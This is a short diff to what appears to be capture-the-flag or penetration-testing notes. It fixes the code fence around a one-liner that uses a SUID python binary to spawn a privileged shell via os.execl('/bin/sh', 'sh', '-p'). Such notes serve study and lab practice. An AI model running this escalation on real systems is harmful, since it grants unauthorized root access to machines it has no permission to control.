@@ -45,6 +45,6 @@ Find flag specifying filetype and name and output errors to dev/null
 
 If for example we find that python has SUID permissions, we can move to the python directory and escalate privileges with:
 
-```./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'````
+```./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'```
 
 
